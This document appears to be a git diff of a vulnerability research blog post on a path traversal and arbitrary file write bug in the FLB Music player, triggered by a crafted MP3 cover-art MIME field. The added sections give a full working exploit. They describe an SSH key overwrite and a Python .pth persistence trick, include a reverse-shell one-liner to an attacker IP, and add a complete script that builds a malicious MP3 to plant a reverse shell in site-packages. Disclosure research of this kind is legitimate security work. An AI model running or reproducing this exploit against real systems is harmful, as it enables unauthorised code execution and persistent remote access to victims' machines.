@@ -5,6 +5,7 @@ date: 2026-07-24
 categories:
   - Research
   - CVE
+  - RCE
 tags:
   - Linux
   - RCE
@@ -12,6 +13,7 @@ tags:
   - PathTraversal
   - Research
   - CVE
+  - PTH
 keywords:
   - ""
   - ""
@@ -287,15 +289,18 @@ Once loaded, our file is created proving we have an arbitrary file write primiti
 ![](/images/FLB_Music/list_files.png)
 
 
-### Getting RCE
-This vulnerability can also be used to achieve remote code execution. There are several interesting ways of getting RCE, for example:
+### Achieving Code Execution
+This vulnerability can also be used to code execution. The reason we are not calling it remote code execution is because this vulnerability is triggered locally, making it a local code execution. There are several interesting ways of getting code execution, for example:
+
 * Writing an attacker's SSH Key and using it to authenticate
 * Overwriting terminal files such as `~/.bashrc`
 * Overwriting python module files such as `re.py`, which is triggered when `import re` is used(We covered this in [this post](/blog/ytdlnis/ytdlnis/)).
 * Overwriting python `.pth` files
 
 
-For this example, we will keep it simple and go with writing an SSH key. First things first, we can create an SSH key pair.
+
+#### Writing an SSH Key
+Let's look at the first approach, here we will keep it simple and go with writing an SSH key. First things first, we can create an SSH key pair.
 ![](/images/FLB_Music/generate_ssh_key.png)
 
 Create a new malicious MP3 file with the SSH key content and path
@@ -338,3 +343,180 @@ Checking the ssh public key, we can see that it was overwritten.
 
 With our private key, we can now login to the machine.
 ![](/images/FLB_Music/ssh_key_auth.png)
+
+
+
+But there is a problem with this approach, we would need to know the username we are targeting which lowers the success rate of our exploit. Therefore, we need to find a better approach. Another hinderance is that our target machine needs to have the ssh service running and exposed to our attacker machine. This combination of limitations lowers the quality of our exploit.
+
+
+#### Improving our Exploit with a Relative Write
+
+To improve the success rate of our exploit, we can first utilize a relative write rather than an absolute one, this solves our first problem. To solve the second challenge, we can use python `.pth` files.
+
+A `.pth` file is a plain text file that you place in your site-packages directory. When Python starts up, it parses the content of each .pth, line by line. Every python code in the `.pth` will be executed when python starts up.
+
+We can check our `site-packages` directory using the following python code.
+```c
+>>> import sys
+>>> 
+>>> for path in sys.path:
+...     print(path)
+... 
+
+/usr/lib/python310.zip
+/usr/lib/python3.10
+/usr/lib/python3.10/lib-dynload
+/home/zerofrost/.local/lib/python3.10/site-packages
+__editable__.apklens-0.1.0.finder.__path_hook__
+/usr/local/lib/python3.10/dist-packages
+/usr/local/lib/python3.10/dist-packages/LinkFinder-1.0-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/kyubi-0.1.0-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/pyfiglet-0.8.post1-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/colorterm-0.3-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/argparse-1.4.0-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/ghauri-1.1.9-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/tldextract-3.4.0-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/requests_file-1.5.1-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/sstv-0.1-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/PySoundFile-0.9.0.post1-py3.10.egg
+/usr/local/lib/python3.10/dist-packages/pycparser-2.22-py3.10.egg
+/usr/lib/python3/dist-packages
+
+```
+
+Python supports a feature called site-specific configuration hooks. Its main purpose is to add custom paths to the module search path. To do this, a `.pth` file with an arbitrary name can be put in the .local/lib/pythonX.Y/site-packages/ folder in a user's home directory.
+
+For example, in our case, if we create a file `/home/zerofrost/.local/lib/python3.10/site-packages/test.pth` and add the following python code, every time python starts, our code will be executed. 
+```python
+import time;open('/tmp/pwned','w').write('This works!!!!');time.sleep(30)
+```
+
+> When writing `.pth` files , make sure your code is in one line for better results
+
+
+Verify file contents and ensure `/tmp/pwned` does not exist
+```c        
+$ cat ~/.local/lib/python3.10/site-packages/test_path.pth
+import time;open('/tmp/pwned','w').write('This works!!!!');time.sleep(30)
+
+$ cat /tmp/pwned                                                       
+cat: /tmp/pwned: No such file or directory
+
+
+```
+
+Run the `python` command to trigger the payload, our shell hangs (due to the `time.sleep(30)` call) after which we interrupt it by pressing `Ctrl-C`. Checking our `/tmp/pwned` file this time, we can see that it was written successfully.
+```c
+$ python3 -c 'print(1+1)'                                            
+^CFatal Python error: init_import_site: Failed to import the site module
+Python runtime state: initialized
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/site.py", line 636, in <module>
+    main()
+  File "/usr/lib/python3.10/site.py", line 622, in main
+    known_paths = addusersitepackages(known_paths)
+  File "/usr/lib/python3.10/site.py", line 349, in addusersitepackages
+    addsitedir(user_site, known_paths)
+  File "/usr/lib/python3.10/site.py", line 232, in addsitedir
+    addpackage(sitedir, name, known_paths)
+  File "/usr/lib/python3.10/site.py", line 192, in addpackage
+    exec(line)
+  File "<string>", line 1, in <module>
+KeyboardInterrupt
+
+$ cat /tmp/pwned
+This works!!!!                                                                      
+$ 
+
+```
+
+
+The only thing remaining now is to swap our python code with a malicious payload to spawn a reverse shell back to our attacker machine. For this , we can use the following python reverse shell payload
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+
+The final exploit is as follows
+```python
+#! /usr/bin/python3
+# -*- coding: utf-8 -*-
+#  @author: zerofrost🦊
+#  @date: 2026-4-10
+#  @description: This script exploits an arbitrary file write via Path Traversal to achieve RCE 
+
+import argparse
+import string
+import random
+from mutagen.id3 import ID3, APIC
+
+
+
+parser=argparse.ArgumentParser()
+parser.add_argument('-lhost','--lhost',help='IP of the attacker machine e.g 192.168.0.102',default="192.168.0.102")
+parser.add_argument('-lport','--lport',help='Listen port for the attacker machine e.g 4444',default="4444")
+args=parser.parse_args()
+
+print(f'')
+print(f'     ========================================================')
+print(f'     == FLB Music Arb File Write +  Path Traversal to  RCE ==')
+print(f'     ============== Affected versions 1.2.1 =================')
+print(f'     ========================================================')
+print(f'\n\n')
+
+
+import random
+
+def create_payload(filepath='/dev/shm/hacked',content='yayhacked'):
+  mime=f'image/png/../../../../{filepath}' # ->  use a relative write to ~/
+  print(f'[*] Generated filepath : {mime}')
+  
+  audio = ID3() 
+  picture_data = content.encode()
+  audio.add(APIC(
+      encoding=3,  # set encoding to UTF-8
+      mime=mime, 
+      type=3,  # front cover image
+      desc='Cover Art',
+      data=picture_data # malicious data
+  ))
+  name= ''.join(random.sample(string.ascii_lowercase,7)) # we use a random name to prevent caching
+  outfile=f'/tmp/testing/{name}.mp3'
+  print(f'[*] Writing malicious file to : {outfile}')
+  audio.save(outfile)
+
+
+print(f'[+] Setting attacker listener as {args.lhost}:{args.lport}')
+print(f'[+] Creating python RCE payload')
+payload=f"""
+import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{args.lhost}",{args.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.Popen(["/bin/sh","-i"]);os._exit(0)
+"""
+
+pth_file='.local/lib/python3.10/site-packages/test_path.pth'
+print(f'[+] Creating .pth file to write to: ~/{pth_file}')
+
+
+create_payload(filepath=pth_file,content=payload) 
+
+```
+
+Generate the malicious payload
+![](/images/FLB_Music/generate_payload.png)
+
+
+Import the malicious file
+![](/images/FLB_Music/load_payload.png)
+
+
+Verify the payload was written and start the listener
+![](/images/FLB_Music/start_listener.png)
+
+
+When `python` is executed by any process, we get a reverse shell.
+![](/images/FLB_Music/pop_shell.png)
+
+
+
+
+### References
+* https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/
+* https://github.com/FLB-Music/FLB-Music-Player
